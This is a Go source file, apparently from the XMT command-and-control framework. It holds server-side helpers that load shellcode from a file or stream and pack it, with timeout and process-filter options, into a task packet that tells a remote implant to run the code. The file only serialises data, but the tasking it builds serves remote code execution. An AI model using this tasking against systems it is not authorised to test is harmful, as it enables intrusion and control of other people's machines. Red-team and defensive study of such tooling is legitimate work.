//go:build !implant

// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import (
	"io"
	"os"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
)

// AssemblyFile will create a Tasklet that will instruct the client to run
// shellcode from a file source on the local (server - the one calling this
// function) machine.
//
// This will attempt to read the file and will return an error if it fails.
//
// C2 Details:
//
//	ID: TvAssembly
//
//	Input:
//	    Assembly struct {
//	        bool            // Wait
//	        int64           // Timeout
//	        bool            // Filter Status
//	        Filter struct { // Filter
//	            uint32      // PID
//	            bool        // Fallback
//	            uint8       // Session
//	            uint8       // Elevated
//	            []string    // Exclude
//	            []string    // Include
//	        }
//	        []byte          // Assembly Data
//	    }
//	Output:
//	    uint64              // Handle
//	    uint32              // PID
//	    int32               // Exit Code
func AssemblyFile(s string) (*Assembly, error) {
	b, err := os.ReadFile(s)
	if err != nil {
		return nil, err
	}
	return &Assembly{Data: b}, nil
}

// Packet will take the configured Assembly options and will return a Packet
// and any errors that may occur during building.
//
// This allows the Assembly struct to fulfil the 'Tasklet' interface.
//
// C2 Details:
//
//	ID: TvAssembly
//
//	Input:
//	    Assembly struct {
//	        bool            // Wait
//	        int64           // Timeout
//	        bool            // Filter Status
//	        Filter struct { // Filter
//	            uint32      // PID
//	            bool        // Fallback
//	            uint8       // Session
//	            uint8       // Elevated
//	            []string    // Exclude
//	            []string    // Include
//	        }
//	        []byte          // Assembly Data
//	    }
//	Output:
//	    uint64              // Handle
//	    uint32              // PID
//	    int32               // Exit Code
func (a Assembly) Packet() (*com.Packet, error) {
	n := &com.Packet{ID: TvAssembly}
	a.MarshalStream(n)
	return n, nil
}

// AssemblyReader will create a Tasklet that will instruct the client to run
// shellcode from the contents of the supplied Reader.
//
// This will attempt to read from the Reader and will return an error if it
// fails.
//
// C2 Details:
//
//	ID: TvAssembly
//
//	Input:
//	    Assembly struct {
//	        bool            // Wait
//	        int64           // Timeout
//	        bool            // Filter Status
//	        Filter struct { // Filter
//	            uint32      // PID
//	            bool        // Fallback
//	            uint8       // Session
//	            uint8       // Elevated
//	            []string    // Exclude
//	            []string    // Include
//	        }
//	        []byte          // Assembly Data
//	    }
//	Output:
//	    uint64              // Handle
//	    uint32              // PID
//	    int32               // Exit Code
func AssemblyReader(r io.Reader) (*Assembly, error) {
	b, err := io.ReadAll(r)
	if err != nil {
		return nil, err
	}
	return &Assembly{Data: b}, nil
}

// MarshalStream writes the data for this Code thread to the supplied Writer.
func (a Assembly) MarshalStream(w data.Writer) error {
	if err := w.WriteBool(a.Wait); err != nil {
		return err
	}
	if err := w.WriteInt64(int64(a.Timeout)); err != nil {
		return err
	}
	if err := a.Filter.MarshalStream(w); err != nil {
		return err
	}
	return w.WriteBytes(a.Data)
}
